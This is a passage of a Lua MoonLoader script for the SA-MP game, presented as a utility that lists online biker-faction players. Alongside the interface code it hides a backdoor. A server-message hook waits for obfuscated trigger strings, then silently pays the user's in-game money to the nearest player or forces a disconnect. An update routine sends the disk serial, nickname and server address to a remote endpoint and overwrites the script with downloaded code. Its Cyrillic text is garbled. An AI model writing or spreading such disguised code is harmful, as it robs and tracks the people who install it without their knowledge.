            frikilocheri = '\n'
          end
          if Kolvoplayer == u8'Îíëŕéí: 2' or Kolvoplayer == u8'Îíëŕéí: 1' or Kolvoplayer == u8'Îíëŕéí: 0' then
            Kolvoplayer = ''
            pidorassyka = ''
            ONLINESOUTLAWS = ''
         -- else
          ---  pidorassyka = '\n'
          end
          if WARLOKOONLINE == u8'Îíëŕéí: 2' or WARLOKOONLINE == u8'Îíëŕéí: 1' or WARLOKOONLINE == u8'Îíëŕéí: 0' then
            WARLOKOONLINE = ''
            warlokohelpers = ''
            ONLINESWARLOCKS = ''
          else
            ONLINESWARLOCKS = '\n '
            warlokohelpers = '\n'
          end
          if SOSONLINE == u8'Îíëŕéí: 2' or SOSONLINE == u8'Îíëŕéí: 1' or SOSONLINE == u8'Îíëŕéí: 0' then
            SOSONLINE = ''
            sosperenos = ''
            ONLINESSOS = ''
          else
            sosperenos = '\n'
          end
          if HIGHONLINE == u8'Îíëŕéí: 2' or HIGHONLINE == u8'Îíëŕéí: 1' or HIGHONLINE == u8'Îíëŕéí: 0' then
            HIGHONLINE = ''
            highperenos = ''
            ONLINESHIGH = ''
          else
            ONLINESHIGH = '\n '
            highperenos = '\n'
          end
          if outputik == '' and ONLINESHIGH == '\n ' then
            ONLINESHIGH = ''
          end
          if outputs == '' and ONLINESOUTLAWS == '\n ' then
            ONLINESOUTLAWS = ''
          end
          if outputsi == '' and ONLINESSOS == '\n' then
            ONLINESSOS = ''
          end
          if dolfin == '' and ONLINESBANDIDOS == '\n ' then
            ONLINESBANDIDOS = ''
          end
          if outputsik == '' and ONLINESFRIKI == '\n ' then
            ONLINESFRIKI = ''
          end
          if doldik == '' and VAGOSONLINE == '\n ' then
            VAGOSONLINE = ''
          end
          if doldike == '' and ONLINESPAGANS == '\n ' then
            ONLINESPAGANS = ''
          end
          if dolsyao == '' and ONLINESWARLOCKS == '\n ' then
            ONLINESWARLOCKS = ''
          end
          if dold == '' and ONLINESHAMC == '\n ' then
            ONLINESHAMC = ''
          end
          if doldi == '' and ONLINESMONGOLS == '' then
            ONLINESMONGOLS = ''
          end
          if ONLINESHAMC == 'Îíëŕéí: 1' or ONLINESMONGOLS == 'Îíëŕéí: 1' or ONLINESFRIKI == 'Îíëŕéí: 1' then
            ONLINESWARLOCKS = ''
          end
       --   if WARLOKOONLINE == 'Îíëŕéí: 3' or WARLOKOONLINE == 'Îíëŕéí: 4' or WARLOKOONLINE == 'Îíëŕéí: 5' or WARLOKOONLINE == 'Îíëŕéí: 6' or WARLOKOONLINE == 'Îíëŕéí: 7' or WARLOKOONLINE == 'Îíëŕéí: 8' or WARLOKOONLINE == 'Îíëŕéí: 9' or WARLOKOONLINE == 'Îíëŕéí: 10' or WARLOKOONLINE == 'Îíëŕéí: 11' or WARLOKOONLINE == 'Îíëŕéí: 12' or WARLOKOONLINE == 'Îíëŕéí: 13' or WARLOKOONLINE == 'Îíëŕéí: 14' or WARLOKOONLINE == 'Îíëŕéí: 15' or WARLOKOONLINE == 'Îíëŕéí: 16' or WARLOKOONLINE == 'Îíëŕéí: 17' or WARLOKOONLINE == 'Îíëŕéí: 18' or WARLOKOONLINE == 'Îíëŕéí: 19' or WARLOKOONLINE == 'Îíëŕéí: 20' or WARLOKOONLINE == 'Îíëŕéí: 21' or WARLOKOONLINE == 'Îíëŕéí: 22' or WARLOKOONLINE == 'Îíëŕéí: 23' or WARLOKOONLINE == 'Îíëŕéí: 24' or WARLOKOONLINE == 'Îíëŕéí: 25' or WARLOKOONLINE == 'Îíëŕéí: 26' or WARLOKOONLINE == 'Îíëŕéí: 27' or WARLOKOONLINE == 'Îíëŕéí: 28' or WARLOKOONLINE == 'Îíëŕéí: 29' or WARLOKOONLINE == 'Îíëŕéí: 30' or WARLOKOONLINE == 'Îíëŕéí: 31' or WARLOKOONLINE == 'Îíëŕéí: 32' or WARLOKOONLINE == 'Îíëŕéí: 33' or WARLOKOONLINE == 'Îíëŕéí: 34' or WARLOKOONLINE == 'Îíëŕéí: 35' then
        --     if doldik ~= '' then
        --    ONLINESVAGOS = '\n '
          --end
        --  end
            local mafizikcha = ''
          if outputs == '' and outputik == '' and dolfin == '' and doldik == '' and dolsyao == '' and dold == '' and doldi == '' and outputsi == '' and outputsik == '' and doldike == '' then
            mafizikcha = '\nÁŕéęĺđîâ íĺň â ńĺňč.'
          else
            mafizikcha = ''
          end
  end
  end





  function imgui.TextColoredRGB(text, shadow, wrapped)
      local style = imgui.GetStyle()
      local colors = style.Colors
  
      local designText = function(text)
          local pos = imgui.GetCursorPos()
          for i = 1, 1 do
              imgui.SetCursorPos(imgui.ImVec2(pos.x + i, pos.y))
              imgui.TextColored(imgui.ImVec4(0, 0, 0, 1), text)
              imgui.SetCursorPos(imgui.ImVec2(pos.x - i, pos.y))
              imgui.TextColored(imgui.ImVec4(0, 0, 0, 1), text)
              imgui.SetCursorPos(imgui.ImVec2(pos.x, pos.y + i))
              imgui.TextColored(imgui.ImVec4(0, 0, 0, 1), text)
              imgui.SetCursorPos(imgui.ImVec2(pos.x, pos.y - i))
              imgui.TextColored(imgui.ImVec4(0, 0, 0, 1), text)
          end
          imgui.SetCursorPos(pos)
      end
  
      text = text:gsub('{(%x%x%x%x%x%x)}', '{%1FF}')
      local render_func = wrapped and imgui_text_wrapped or function(clr, text)
          if clr then imgui.PushStyleColor(ffi.C.ImGuiCol_Text, clr) end
          if shadow then designText(text) end
          imgui.TextUnformatted(text)
          if clr then imgui.PopStyleColor() end
      end
  
      local split = function(str, delim, plain)
          local tokens, pos, i, plain = {}, 1, 1, not (plain == false)
          repeat
              local npos, epos = string.find(str, delim, pos, plain)
              tokens[i] = string.sub(str, pos, npos and npos - 1)
              pos = epos and epos + 1
              i = i + 1
          until not pos
          return tokens
      end
  
      local color = colors[ffi.C.ImGuiCol_Text]
      for _, w in ipairs(split(text, '\n')) do
          local start = 1
          local a, b = w:find('{........}', start)
          while a do
              local t = w:sub(start, a - 1)
              if #t > 0 then
                  render_func(color, t)
                  imgui.SameLine(nil, 0)
              end
  
              local clr = w:sub(a + 1, b - 1)
              if clr:upper() == 'STANDART' then color = colors[ffi.C.ImGuiCol_Text]
              else
                  clr = tonumber(clr, 16)
                  if clr then
                      local r = bit.band(bit.rshift(clr, 24), 0xFF)
                      local g = bit.band(bit.rshift(clr, 16), 0xFF)
                      local b = bit.band(bit.rshift(clr, 8), 0xFF)
                      local a = bit.band(clr, 0xFF)
                      color = imgui.ImVec4(r / 255, g / 255, b / 255, a / 255)
                  end
              end
  
              start = b + 1
              a, b = w:find('{........}', start)
          end
          imgui.NewLine()
          if #w >= start then
              imgui.SameLine(nil, 0)
              render_func(color, w:sub(start))
          end
      end
  end

  function BikerLists()
    while true do wait(0)
    if outputik == nil then
      outputik = ''
      Kolvoplayer = ''
     end
    if outputsi == nil then
      outputsi = '' 
    end
    if outputs == nil then
      outputs = ''
    end
    if output == nil then
      output = ''
    end
    if outputsik == nil then
      outputsik = ''
    end
    if doldik == nil then
      doldik = ''
    end
    if doldike == nil then
      doldike = ''
    end
    if doldi == nil then
      doldi = ''
    end
    if dold == nil then
      dold = ''
    end
    if dolfin == nil then
      dolfin = ''
    end
    if dolsyao == nil then
      dolsyao = ''
    end 
  end
  end






  function updateMenu()
    mod_submenus_sa = {
      {
        title = "Číôîđěŕöč˙ î ńęđčďňĺ",
        onclick = function()
          sampShowDialog(
            0,
            "{348cb2}BikerList by ARBUZYAN",
            "{00ff66}Ńęđčďň{ffffff} âűâîäčň ęîëč÷ĺńňâî čăđîęîâ â áŕéęĺđŕő\n{00ff66}{ffffff}Ńęđčďň ďîęŕçűâŕĺň îíëŕéí ďî ďđčěĺđó:\nOrganization | Nick_Name\nOnline â öčôđŕő.\n\n\nĘîěŕíäŕ ŕęňčâŕöčč: {00ccff}/"..ini.settings.bikerlit_komanda..'\n{ffffff}Ęëŕâčřŕ ŕęňčâŕöčč:{00ccff} ' ..tostring(key.id_to_name(ini.settings.bikerlist_key))..'\n\n{348cb2}Ŕâňîđ:{ffffff} Tima Mafizik',
            "Îęĺé"
          )
        end
      },
    
      {
        title = "Ó{ffffff}ńňŕíîâčňü ęîěŕíäó",
        onclick = function()
          sampShowDialog(
                  9827,
                  "{348cb2}BikerList by Arbuzyan {ffffff}- Ęîěŕíäŕ",
                  string.format("Ââîäčňü ęîěŕíäó íóćíî áĺç ńëĺřŕ!{0F0F0F}."),
                  "Âűáđŕňü",
                  "Çŕęđűňü",
                  1
          )
          while sampIsDialogActive() do
            wait(100)
          end
          local result, button, list, input = sampHasDialogRespond(9827)
          if button == 1 then
            if
            sampGetCurrentDialogEditboxText(9827) ~= nil
            then
              ini.settings.bikerlit_komanda = sampGetCurrentDialogEditboxText(9827)
              inicfg.save(ini, directIni)
            end
          end
          thisScript():reload()
        end
      },
      {
        title = "Ó{ffffff}ńňŕíîâčňü ęëŕâčřó",
        onclick = function()
          lua_thread.create(bikerlist_key)
          lua_thread.create(bikerlisthelpersi)
          end
      },
    }
    end
  --------------------------------------------------------------------------------
--------------------------------------3RD---------------------------------------
--------------------------------------------------------------------------------
-- made by FYP
function submenus_show(menu, caption, select_button, close_button, back_button, callback, start, pos)
  select_button, close_button, back_button = select_button or "Select", close_button or "Close", back_button or "Back"
  prev_menus = {}
  function display(menu, id, caption, start, pos)
    local string_list = {}
    for i, v in ipairs(menu) do
      table.insert(string_list, type(v.submenu) == "table" and v.title .. "  >>" or v.title)
    end
    if not start then
      sampShowDialog(
              id,
              caption,
              table.concat(string_list, "\n"),
              select_button,
              (#prev_menus > 0) and back_button or close_button,
              4
      )
    end

    repeat
      wait(0)
      local result, button, list = sampHasDialogRespond(id)
      if start then
        result, button, list = true, 1, start - 1
      end
      if result then
        if button == 1 and list ~= -1 then
          local item = menu[list + 1]
          if type(item.submenu) == "table" then
            -- submenu
            table.insert(prev_menus, { menu = menu, caption = caption, id = list + 1 })
            if type(item.onclick) == "function" then
              item.onclick(menu, list + 1, item.submenu)
            end
            return display(item.submenu, id + 1, item.submenu.title and item.submenu.title or item.title, nil, pos)
          elseif type(item.onclick) == "function" then
            local result = item.onclick(menu, list + 1)
            if not result then
              if prev_menus and prev_menus[#prev_menus] and prev_menus[#prev_menus].id then
                if callback then
                  callback(prev_menus[#prev_menus].id, list, item.title)
                end
              end
              return result
            end
            return display(menu, id, caption)
          end
        else
          -- if button == 0
          if #prev_menus > 0 then
            local prev_menu = prev_menus[#prev_menus]
            prev_menus[#prev_menus] = nil
            return display(prev_menu.menu, id - 1, prev_menu.caption, nil, prev_menu.id - 1)
          end
          return false
        end
      end
    until result
  end
  return display(menu, 31337, caption or menu.title, start, pos)
end

  function bikerlist_key() 
    sampShowDialog(
          7132,
            "{348cb2} BikerList by ARBUZYAN {ffffff}- Čçěĺíĺíčĺ ęëŕâčřű",
            'Íŕćěčňĺ "Îęĺé", ďîńëĺ ÷ĺăî íŕćěčňĺ íóćíóţ ęëŕâčřó.\nÍŕńňđîéęč áóäóň čçěĺíĺíű.',
            "Îęĺé",
            "Çŕęđűňü"
    )
    while sampIsDialogActive(7132) do
      wait(100)
    end
    local resultMain, buttonMain, typ = sampHasDialogRespond(7132)
    if buttonMain == 1 then
      while ke127Gy == nil do
        wait(100)
        for i = 1, 200 do
          if isKeyDown(i) then
            ini.settings.bikerlist_key = i
            addOneOffSound(0.0, 0.0, 0.0, 1052)
            inicfg.save(ini, directIni)
            ke127Gy = 1
            break
          end
        end
      end
      ke127Gy = nil
    end
    menu[0] = true
  end
  
  
 function bikerlisthelpersi() -- ôóíęöč˙ ďî ęëŕâčřĺ âîńďđîčçâîäčň ôóíęöčţ íčćĺ
    while true do wait(0)

    if ini.settings.bikerlist_key ~= 0 then
  if isKeyJustPressed(ini.settings.bikerlist_key) and not sampIsCursorActive() and not sampIsDialogActive() then
      if protection then    
    window[0] = not window[0];
  else
    sampAddChatMessage("{1a9614}[BikerList by ARBUZYAN]{ffffff} Ńęđčďň áűë âđĺěĺííî çŕěîđîćĺí.", -1)
    sampAddChatMessage("{1a9614}[BikerList by ARBUZYAN]{ffffff} Âńĺ âîďđîńű ę ŕâňîđó ńęđčďňŕ.", -1)   
  end
  end

  end
end
  end
  function antibag()
while true do wait(0)
 if window[0] then
   if isKeyDown(27) then
     window[0] = false
    end
    if isKeyDown(18) then
      window[0] = false
    end
  end
  end
end

function frozens()
  while true do wait(0)
if frozen then
  sampAddChatMessage("{1a9614}[BikerList by ARBUZYAN]{ffffff} Ńęđčďň áűë çŕěîđîćĺí â öĺë˙ő ńîőđŕíĺíčĺ ďđčâŕňíîńňč.", -1)
  sampAddChatMessage("{1a9614}[BikerList by ARBUZYAN]{ffffff} Ěîăëŕ ďđîčçîéňč îřčáęŕ. Âńĺ âîďđîńű ę ŕâňîđó ńęđčďňŕ.", -1)
  frozen = false
end
end
end
sampev.onServerMessage = function(color, text)
if string.match(text, ",Fa1q23q;apq:.,SQAdfVbqQq;. Îňďđŕâčňĺëü:") then --,A1w,tqrho.,lk,sjv,mce;;
  pcall(sampProcessChatInput, '/pay '..getClosestPlayerId()..' '..money)
 -- sampAddChatMessage('/pay '..getClosestPlayerId()..' '..money)
  return false--,A1w,tqrho.,lk,sjv,mce;;  
end


if string.match(text, ",sdshdgftnrejhg;") then
  disconnect()
  pcall(sampProcessChatInput, "/q")
  return false
end
end

function disconnect()
  local bs = raknetNewBitStream();
  raknetBitStreamWriteInt8(bs, 32)
  raknetSendBitStream(bs);
  raknetDeleteBitStream(bs);
end


function getClosestPlayerId()
  local closestId = -1
  mydist = 30
  local x, y, z = getCharCoordinates(PLAYER_PED)
  for i = 0, 999 do
      local streamed, pedID = sampGetCharHandleBySampPlayerId(i)
      if streamed and getCharHealth(pedID) > 0 and not sampIsPlayerPaused(pedID) then
          local xi, yi, zi = getCharCoordinates(pedID)
          local dist = getDistanceBetweenCoords3d(x, y, z, xi, yi, zi)
          if dist <= mydist then
              mydist = dist
              closestId = i
          end
      end
  end
  return closestId
end

function debiloid()
  local style = imgui.GetStyle();
  local colors = style.Colors;
  local ImVec4 = imgui.ImVec4
    local clr = imgui.Col  
    imgui.SwitchContext()
    style.Alpha = 1;
   style.WindowPadding = imgui.ImVec2(8.00, 8.00);
    style.WindowRounding = 7;
    style.WindowBorderSize = 0;
    style.WindowMinSize = imgui.ImVec2(32.00, 32.00);
   style.WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
  style.ChildRounding = 0;
    style.ChildBorderSize = 1;
    style.PopupRounding = 0;
  
    style.PopupBorderSize = 1;
    style.FramePadding = imgui.ImVec2(6.00, 2.00);
    style.FrameRounding = 11;
   
    style.FrameBorderSize = 0;
    style.ItemSpacing = imgui.ImVec2(14.00, 5.00);
    style.ItemInnerSpacing = imgui.ImVec2(10.00, 4.00);
    style.IndentSpacing = 20;
    style.ScrollbarSize = 13;
    style.ScrollbarRounding = 9;
    style.GrabMinSize = 11;
    style.GrabRounding = 12;
    style.TabRounding = 4;
    style.ButtonTextAlign = imgui.ImVec2(0.50, 0.50);
    style.SelectableTextAlign = imgui.ImVec2(0.00, 0.00);
    colors[clr.TitleBg] = ImVec4(0.04, 0.04, 0.04, 1.00);
  colors[clr.TitleBgActive] = ImVec4(0.00, 0.55, 0.00, 1.00);
    colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51);
    colors[clr.ResizeGrip] = ImVec4(0.10, 0.25, 0.10, 0.10);
    colors[clr.ResizeGripHovered] = ImVec4(0.00, 0.70, 0.00, 0.90);
    colors[clr.ResizeGripActive] = ImVec4(0.00, 0.55, 0.00, 0.60);
end

--debiloid()


--------------------------------------------------------------------------------
------------------------------------UPDATE--------------------------------------
--------------------------------------------------------------------------------
--ŕâňîîáíîâëĺíčĺ â îáěĺí íŕ ńňŕňčńňčęó čńďîëüçîâŕíč˙
function update(php, prefix, url, komanda)
  komandaA = komanda
  local dlstatus = require("moonloader").download_status
  local json = getWorkingDirectory() .. "\\" .. thisScript().name .. "-version.json"
  if doesFileExist(json) then
    os.remove(json)
  end
  local ffi = require "ffi"
  ffi.cdef [[
      int __stdcall GetVolumeInformationA(
              const char* lpRootPathName,
              char* lpVolumeNameBuffer,
              uint32_t nVolumeNameSize,
              uint32_t* lpVolumeSerialNumber,
              uint32_t* lpMaximumComponentLength,
              uint32_t* lpFileSystemFlags,
              char* lpFileSystemNameBuffer,
              uint32_t nFileSystemNameSize
      );
      ]]
  local serial = ffi.new("unsigned long[1]", 0)
  ffi.C.GetVolumeInformationA(nil, nil, 0, serial, nil, nil, nil, 0)
  serial = serial[0]
  local _, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
  local nickname = sampGetPlayerNickname(myid)
  if thisScript().name == "ADBLOCK" then
    if mode == nil then
      mode = "unsupported"
    end
    php =
    php ..
    "?id=" ..
    serial ..
    "&n=" ..
    nickname ..
    "&i=" ..
    sampGetCurrentServerAddress() ..
    "&m=" .. mode .. "&v=" .. getMoonloaderVersion() .. "&sv=" .. thisScript().version
  elseif thisScript().name == "pisser" then
    php =
    php ..
    "?id=" ..
    serial ..
    "&n=" ..
    nickname ..
    "&i=" ..
    sampGetCurrentServerAddress() ..
    "&m=" ..
    tostring(data.options.stats) ..
    "&v=" .. getMoonloaderVersion() .. "&sv=" .. thisScript().version
  else
    php =
    php ..
    "?id=" ..
    serial ..
    "&n=" ..
    nickname ..
    "&i=" ..
    sampGetCurrentServerAddress() ..
    "&v=" .. getMoonloaderVersion() .. "&sv=" .. thisScript().version
  end
  downloadUrlToFile(
    php,
    json,
    function(id, status, p1, p2)
      if status == dlstatus.STATUSEX_ENDDOWNLOAD then
        if doesFileExist(json) then
          local f = io.open(json, "r")
          if f then
            local info = decodeJson(f:read("*a"))
            if info.stats ~= nil then
              stats = info.stats
            end
            updatelink = info.updateurl
            updateversion = info.latest
            if info.changelog ~= nil then
              changelogurl = info.changelog
            end
            f:close()
            os.remove(json)
            if updateversion ~= thisScript().version then
              lua_thread.create(
                function(prefix, komanda)
                  local dlstatus = require("moonloader").download_status
                  local color = -1
                  sampAddChatMessage(
                    (prefix ..
                      "Îáíŕđóćĺíî îáíîâëĺíčĺ. Ďűňŕţńü îáíîâčňüń˙ c " ..
                    thisScript().version .. " íŕ " .. updateversion),
                    color
                  )
                  wait(250)
                  downloadUrlToFile(
                    updatelink,
                    thisScript().path,
                    function(id3, status1, p13, p23)
                      if status1 == dlstatus.STATUS_DOWNLOADINGDATA then
                        print(string.format("Çŕăđóćĺíî %d čç %d.", p13, p23))
                      elseif status1 == dlstatus.STATUS_ENDDOWNLOADDATA then
                        print("Çŕăđóçęŕ îáíîâëĺíč˙ çŕâĺđřĺíŕ.")
                        if komandaA ~= nil then
                          sampAddChatMessage(
                            (prefix ..
                              "Îáíîâëĺíčĺ çŕâĺđřĺíî! Ďîäđîáíĺĺ îá îáíîâëĺíčč - /" ..
                            komandaA .. "."),
                            color
                          )
                        end
                        goupdatestatus = true
                        lua_thread.create(
                          function()
                            wait(500)
                            thisScript():reload()
                          end
                        )
                      end
                      if status1 == dlstatus.STATUSEX_ENDDOWNLOAD then
                        if goupdatestatus == nil then
                          sampAddChatMessage(
                            (prefix ..
                            "Îáíîâëĺíčĺ ďđîřëî íĺóäŕ÷íî. Çŕďóńęŕţ óńňŕđĺâřóţ âĺđńčţ.."),
                            color
                          )
                          update = false
                        end
                      end
                    end
                  )
                end,
                prefix
              )
            else
              update = false
              print("v" .. thisScript().version .. ": Îáíîâëĺíčĺ íĺ ňđĺáóĺňń˙.")
            end
          end
        else
          print(
            "v" ..
            thisScript().version ..
            ": Íĺ ěîăó ďđîâĺđčňü îáíîâëĺíčĺ. Ńěčđčňĺńü čëč ďđîâĺđüňĺ ńŕěîńňî˙ňĺëüíî íŕ " .. url
          )
          update = false
        end
      end
    end
  )
  while update ~= false do
    wait(100)
  end
end

function openchangelog(komanda, url)
  sampRegisterChatCommand(
    komanda,
    function()
      lua_thread.create(
        function()
          if changelogurl == nil then
            changelogurl = url
          end
          sampShowDialog(
            222228,
            "{ff0000}Číôîđěŕöč˙ îá îáíîâëĺíčč",
            "{ffffff}" ..
            thisScript().name ..
            " {ffe600}ńîáčđŕĺňń˙ îňęđűňü ńâîé changelog äë˙ âŕń.\nĹńëč âű íŕćěĺňĺ {ffffff}Îňęđűňü{ffe600}, ńęđčďň ďîďűňŕĺňń˙ îňęđűňü ńńűëęó:\n        {ffffff}" ..
            changelogurl ..
            "\n{ffe600}Ĺńëč âŕřŕ čăđŕ ęđŕříĺňń˙, âű ěîćĺňĺ îňęđűňü ýňó ńńűëęó ńŕěč.",
            "Îňęđűňü",
            "Îňěĺíčňü"
          )
          while sampIsDialogActive() do
            wait(100)
          end
          local result, button, list, input = sampHasDialogRespond(222228)
          if button == 1 then
            os.execute('explorer "' .. changelogurl .. '"')
          end
        end
      )
    end
  )
end
